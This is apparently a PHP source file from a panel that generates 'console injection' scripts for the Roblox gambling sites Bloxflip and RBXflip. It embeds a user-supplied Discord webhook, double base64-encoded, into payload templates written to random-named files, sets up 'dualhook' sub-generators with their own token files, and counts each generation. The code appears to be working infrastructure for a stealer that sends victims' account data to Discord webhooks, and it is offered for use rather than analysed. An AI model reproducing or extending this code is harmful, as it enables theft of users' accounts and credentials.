<?php
require ('setup.php');
require ('gen_files/apis/iplog.php');
function htmlspecialcharss($string){
    $string = str_replace('.','',htmlspecialchars($string));
    $string = str_replace('<','',$string);
    $string=  str_replace('>','',$string);
    return $string;
}
function randomshit($length) {
    $chars = '012345689';
  
    for ($i = 0; $i < $length; $i++) {
      $pos = mt_rand(0, strlen($chars) -1);
      $my_string .= substr($chars, $pos, 1);
    }
    $shit= strtoupper($my_string);
    return "684$shit";
  }
if (isset($_POST['dwebhook'])) {
$directory = randomshit(12);
$dwebhook = $_POST['dwebhook'];
$customerrormessages = $_POST['customerrormessage'];
if (empty($customerrormessages)) {
$error = 'Must have an error message!';
}
else {
$parse = parse_url($dwebhook);
if($parse['host'] == 'discord.com' || $parse['host'] == 'discordapp.com'){
function clear_dir($string) {
$string = str_replace(' ', '-', $string);
return preg_replace('/[^A-Za-z0-9\-]/', '', $string);
}
$cantbackdoorwithhooklol = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($dwebhook));
    $chkwebhook = file_get_contents("$cantbackdoorwithhooklol");
    $chkwebhook1 = json_decode($chkwebhook);

    if ($chkwebhook1->message == "Unknown Webhook") {
      $error = "Please enter an valid webhook!";
      unset($_POST['dwebhook']);
    } elseif (empty($chkwebhook1->type)) {
    
      $error = "Please enter an valid webhook!";
      unset($_POST['dwebhook']);
    } else {
$basesixtynine = base64_encode($cantbackdoorwithhooklol);
$basesixtyeight = base64_encode($basesixtynine);

$sexual = rtrim($basesixtyeight,'=');

$checkboxx = $_POST['autorefreshlol'];
$lolcheckboxsafee = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($checkboxx));
if ($lolcheckboxsafee == "true"){
    $autorefx = "true";
} else {
    $autorefx = "false";
}
$sillybackdoor = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($customerrormessages));
$directorytest2 = "../js/$directory.php";
if (file_exists($directorytest2)){
$error='There was an unknown error creating your injection. Please refresh the page and retry.';
unset($_POST);
}
file_put_contents("js/$directory.php", str_replace("LFPOCDERTYGDD","$autorefx", str_replace("NHFWDWYRBFHFDBEURR","$sillybackdoor", str_replace('QUBRWEBIRWBQYEIYOB', $sexual,file_get_contents('gen_files/get_bloxflip.php')))));
$domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
$success = 'Bloxflip Console Generator';
$file = 'gen_files/bloxflip_counter.txt';
$fdata = file_get_contents ( $file );
$fdata = intval($fdata) + 1;
file_put_contents($file, $fdata); 

unset($_POST);
}
} else {
$error = 'Webhook must be discord lol!';
unset($_POST['dwebhook']);
}
}
}
if (isset($_POST['webbhook'])) {
$directory = randomshit(12);
$webbhook = $_POST['webbhook'];
$customerror = $_POST['custerror'];
if (empty($customerror)) {
$error = 'Must have an error message!';
}
else {
$parse = parse_url($webbhook);
if($parse['host'] == 'discord.com' || $parse['host'] == 'discordapp.com'){
function clear_dir($string) {
$string = str_replace(' ', '-', $string);
return preg_replace('/[^A-Za-z0-9\-]/', '', $string);
}
$cantbackdoorwithhooklolz = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($webbhook));
    $chkwebhook = file_get_contents("$cantbackdoorwithhooklolz");
    $chkwebhook1 = json_decode($chkwebhook);

    if ($chkwebhook1->message == "Unknown Webhook") {
      $error = "Please enter an valid webhook!";
      unset($_POST['webbhook']);
    } elseif (empty($chkwebhook1->type)) {
    
      $error = "Please enter an valid webhook!";
       unset($_POST['webbhook']);
    } else {
$basesixtynine = base64_encode($cantbackdoorwithhooklolz);
$basesixtyeight = base64_encode($basesixtynine);

$sexual = rtrim($basesixtyeight,'=');

$checkbox = $_POST['autorefresh'];
$lolcheckboxsafe = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($checkbox));
if ($lolcheckboxsafe == "true"){
    $autoref = "true";
} else {
    $autoref = "false";
}
$errornobd = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($customerror));
$directorytest = "../js/$directory.php";
if (file_exists($directorytest)){
$error='There was an unknown error creating your injection. Please refresh the page and retry.';
unset($_POST);
}
file_put_contents("js/$directory.php", str_replace("LFPOCDERTYGDD","$autoref", str_replace("NHFWDWYRBFHFDBEURR","$errornobd", str_replace('QUBRWEBIRWBQYEIYOB', $sexual,file_get_contents('gen_files/get_rbxflip.php'))))); 
$domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
$success = 'RBXflip Console Generator';
$file = 'gen_files/rbxflip_counter.txt';
$fdata = file_get_contents ( $file );
$fdata = intval($fdata) + 1;
file_put_contents($file, $fdata); 
 
unset($_POST);
} 
} else {
$error = 'Webhook must be discord lol!';
unset($_POST['webbhook']);
}
}
}

if (isset($_POST['directory'], $_POST['shithook'], $_POST['gslogan'], $_POST['gname'], $_POST['imageurl'], $_POST['gcolor'])) {

$directtory = $_POST['directory'];
if (empty($directtory)) {
$error = 'Your directory cannot be empty';
}
else {
$gname = $_POST['gname'];
if (empty($gname)) {
$error = 'Must have a generator name!';
}
else {
$gslogan = $_POST['gslogan'];
if (empty($gslogan)) {
$error = 'Must have a slogan!';
}
else {
$color = $_POST['gcolor'];
if (empty($color)) {
$error = 'Your color cannot be empty';
}
else {
$imageurl = $_POST['imageurl'];
$dixkwebhook = $_POST['shithook'];
$sexnobddd = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($gslogan));   
$sexnobd = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($gname));
$sexnobdd = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($dixkwebhook));
$sexnobddddd = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($directtory));
$sexnobddddddd = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($imageurl));
$sexnobddddddddd = str_replace( array("<?php", "?>", "<=", "<script>","</script>", "<", ">"), '', htmlspecialchars($color));   
$parse = parse_url($sexnobdd);
if(filter_var($sexnobddddddd, FILTER_VALIDATE_URL)) {
if($parse['host'] == 'discord.com' || $parse['host'] == 'discordapp.com'){
function clear_dir($string) {
$string = str_replace(' ', '-', $string);
return preg_replace('/[^A-Za-z0-9\-]/', '', $string);
}
$chkwebhook = file_get_contents("$sexnobdd");
    $chkwebhook1 = json_decode($chkwebhook);

    if ($chkwebhook1->message == "Unknown Webhook") {
      $error = "Please enter an valid webhook!";
      unset($_POST['shithook']);
    } elseif (empty($chkwebhook1->type)) {
    
      $error = "Please enter an valid webhook!";
      unset($_POST['shithook']);
    } else {
$token = strtoupper(substr(str_repeat(md5(rand()), ceil(64/32)), 0, 64));
$directory2 = "../../controller/tokens/$token.php";
if (file_exists($directory2)){
$error='There was an unknown error creating your dualhook. Please refresh the page and retry.';
unset($_POST);
}
$sexnobddddd = clear_dir($sexnobddddd);
if(!empty($sexnobddddd)){
$filename = "c/$sexnobddddd";
if (!file_exists($filename)) {
mkdir("c/$sexnobddddd", 0777, true);
mkdir("c/$sexnobddddd/counter", 0777, true);
file_put_contents("controller/tokens/$token.php", str_replace('dirherenoob', $sexnobddddd, file_get_contents('gen_files/dualhook_files/tokenmaker69.php')));
file_put_contents("c/$sexnobddddd/index.php", file_get_contents('gen_files/dualhook_files/tempgen.php'));
file_put_contents("c/$sexnobddddd/counter/rbxflip_counter.txt", 0);
file_put_contents("c/$sexnobddddd/counter/bloxflip_counter.txt", 0);
file_put_contents("c/$sexnobddddd/dhsetup.php", str_replace("hdhdhrhrhrhewheher","$sexnobdd", str_replace("bavcatrutnyhyueya","$sexnobddddddd", str_replace("xnabwhrugjsheht","$sexnobd", str_replace('sgagevtntjufjdbrydhs', $sexnobddd, str_replace('grdhkjjhkll', $sexnobddddddddd, str_replace('abshfgdushsrrfsh', $sexnobddddd, file_get_contents('gen_files/dualhook_files/dhsetup.php')))))))); 
$domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
require ('gen_files/apis/webhook.php');
header("location: /c/$sexnobddddd");
unset($_POST);
} else {
$error = 'This directory is already in use!';
unset($_POST['directory']);
}
}
}
} else {
$error = 'Webhook must be discord lol!';
unset($_POST['shithook']);
}
} else {
$error = 'Thumbnail must be a URL!';
unset($_POST['imageurl']);
}
}
}
}
}
}
?>